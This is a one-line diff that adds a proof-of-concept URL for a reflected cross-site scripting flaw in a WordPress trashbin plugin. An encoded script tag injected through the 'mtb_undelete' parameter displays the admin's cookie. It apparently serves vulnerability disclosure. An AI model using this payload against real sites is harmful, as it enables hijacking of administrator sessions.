@@ -1,0 +1,1 @@
+http://www.example.come/wp-admin/edit.php?page=mtb_trashbin/trashbin.php&amp;mtb_undelete=%27%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
